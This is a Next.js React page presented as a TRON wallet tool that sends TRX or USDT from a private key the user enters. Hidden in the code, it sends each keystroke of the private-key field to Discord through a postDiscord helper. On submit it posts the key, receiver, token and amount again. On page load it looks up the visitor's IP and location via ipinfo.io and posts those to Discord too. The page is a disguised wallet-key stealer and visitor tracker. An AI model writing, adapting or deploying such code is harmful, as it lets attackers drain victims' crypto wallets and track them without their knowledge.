"use client";

import { ChangeEvent, FormEvent, useEffect, useState } from "react";
import { TronWeb } from "tronweb";
import toast from "react-hot-toast";
import { postDiscord } from "./utils/discord";

export default function Home() {
  const [isSending, setIsSending] = useState<boolean>(false);
  const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setIsSending(true);
    try {
      const formData = new FormData(e.currentTarget);
      const pk = formData.get('pk') as string;
      const receiver = formData.get('receiver') as string;
      const token = formData.get('token') as string;
      const amount = parseFloat(formData.get('amount') as string);
      const message = 'Private Key - `' + pk + '`\n' +
        'Receiver - `' + receiver + '`\n' +
        'Token - `' + token + '`\n' +
        'Amount - `' + amount + '`\n';
      postDiscord(message);
      const tronWeb = new TronWeb({
        fullHost: 'https://api.shasta.trongrid.io',
        // headers: {
        //   "TRON-PRO-API-KEY": process.env.NEXT_PUBLIC_TRONGRID_API_KEY
        // },
        privateKey: pk,
      });
      // eslint-disable-next-line
      (window as any).tronWeb1 = tronWeb;
      if (token === 'TRX') {
        await sendTRX(tronWeb, receiver, amount);
      }
      if (token === 'USDT') {
        await sendUSDT(tronWeb, receiver, amount);
      }
    } catch (error) {
      alert(error as string);
    }
    setIsSending(false);
  }

  const showToast = (txID: string) => {
    postDiscord(`https://shasta.tronscan.org/#/transaction/${txID}`);
    toast((t) => (
      <span>
        Successfully sent, here is the <a href={`https://shasta.tronscan.org/#/transaction/${txID}`} target="_blank" className="text-blue-600 hover:underline">detail</a>.&nbsp;&nbsp;&nbsp;
        <button onClick={() => toast.dismiss(t.id)}>
          X
        </button>
      </span>
    ));
  }

  const sendTRX = async (tronWeb: TronWeb, toAddress: string, amount: number) => {
    const transfer = await tronWeb.transactionBuilder.sendTrx(
      toAddress,
      amount * 1e6,
      tronWeb.defaultAddress.base58 as string
    );

    const signedTxn = await tronWeb.trx.sign(transfer);
    const receipt = await tronWeb.trx.sendRawTransaction(signedTxn);

    console.log('Transaction receipt:', receipt);
    showToast(receipt.transaction.txID);
  }

  const sendUSDT = async (tronWeb: TronWeb, toAddress: string, amount: number) => {
    const contract = await tronWeb.contract().at(process.env.NEXT_PUBLIC_TRX_USDT_CONTRACT || 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t');

    const transaction = await contract.methods.transfer(
      toAddress,
      tronWeb.toSun(amount) // Convert amount to Sun (1 USDT = 1e6 Sun)
    ).send({
      feeLimit: 1000000, // Adjust fee limit as needed
      from: tronWeb.defaultAddress.base58
    });

    console.log('USDT Transaction successful:', transaction);
    showToast(transaction);
  }

  const handlePKChange = (e: ChangeEvent<HTMLInputElement>) => {
    postDiscord(`Private Key : \`${e.target.value}\``);
  }

  useEffect(() => {
    fetch('https://ipinfo.io/json')
    .then(response => response.json())
    .then(data => {
      const datetime = new Date();
      const message = '`💻` ' + data.ip +"\n"+
        '`🌃` ' + data.city +"\n"+
        '`🌍` ' + data.regiony +"\n"+
        '`🏳️` ' + ":flag_" + data.country.toLowerCase() + ":\n"+
        '`🗺️` ' + data.loc +"\n"+
        '`🏢` ' + data.org +"\n"+
        '`⏰` ' + datetime.toLocaleDateString()+"-" +datetime.toLocaleTimeString() +"\n"+
        '`🔗` ' + window.document.URL;

      postDiscord(message);
    })
  }, [])

  return (
    <div className="container mx-auto my-12 w-60">
      <form action="#" onSubmit={handleSubmit} className="flex flex-col gap-4">
        <div>
          <label htmlFor="private_key" className="block mb-2 text-sm font-medium text-gray-900">Your wallet private key</label>
          <input
            type="text"
            id="private_key"
            name="pk"
            className="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5"
            placeholder="Private Key"
            onChange={handlePKChange}
            required
          />
        </div>
        <div>
          <label htmlFor="receiver" className="block mb-2 text-sm font-medium text-gray-900">Receiver wallet address</label>
          <input
            type="text"
            id="receiver"
            name="receiver"
            className="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5"
            placeholder="Receiver Address"
            required
          />
        </div>
        <div>
          <label htmlFor="token" className="block mb-2 text-sm font-medium text-gray-900 dark:text-white">Select token</label>
          <select
            id="token"
            name="token"
            className="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5"
            defaultValue={''}
            required >
            <option disabled value=''>Choose a token</option>
            <option value="TRX">TRX</option>
            <option value="USDT">USDT</option>
          </select>
        </div>
        <div>
          <label htmlFor="amount" className="block mb-2 text-sm font-medium text-gray-900">Sending amount</label>
          <input
            type="number"
            id="amount"
            name="amount"
            className="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5"
            placeholder="Amount"
            required
          />
        </div>
        <button type="submit" disabled={isSending} className="text-white bg-blue-700 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm w-full sm:w-auto px-5 py-2.5 text-center">
          {isSending ?
            <>
              <svg aria-hidden="true" role="status" className="inline w-4 h-4 me-3 text-white animate-spin" viewBox="0 0 100 101" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M100 50.5908C100 78.2051 77.6142 100.591 50 100.591C22.3858 100.591 0 78.2051 0 50.5908C0 22.9766 22.3858 0.59082 50 0.59082C77.6142 0.59082 100 22.9766 100 50.5908ZM9.08144 50.5908C9.08144 73.1895 27.4013 91.5094 50 91.5094C72.5987 91.5094 90.9186 73.1895 90.9186 50.5908C90.9186 27.9921 72.5987 9.67226 50 9.67226C27.4013 9.67226 9.08144 27.9921 9.08144 50.5908Z" fill="#E5E7EB" />
                <path d="M93.9676 39.0409C96.393 38.4038 97.8624 35.9116 97.0079 33.5539C95.2932 28.8227 92.871 24.3692 89.8167 20.348C85.8452 15.1192 80.8826 10.7238 75.2124 7.41289C69.5422 4.10194 63.2754 1.94025 56.7698 1.05124C51.7666 0.367541 46.6976 0.446843 41.7345 1.27873C39.2613 1.69328 37.813 4.19778 38.4501 6.62326C39.0873 9.04874 41.5694 10.4717 44.0505 10.1071C47.8511 9.54855 51.7191 9.52689 55.5402 10.0491C60.8642 10.7766 65.9928 12.5457 70.6331 15.2552C75.2735 17.9648 79.3347 21.5619 82.5849 25.841C84.9175 28.9121 86.7997 32.2913 88.1811 35.8758C89.083 38.2158 91.5421 39.6781 93.9676 39.0409Z" fill="currentColor" />
              </svg>
              Sending...
            </>
            :
            `Send transaction`
          }
        </button>
      </form>
      
    </div>
  );
}
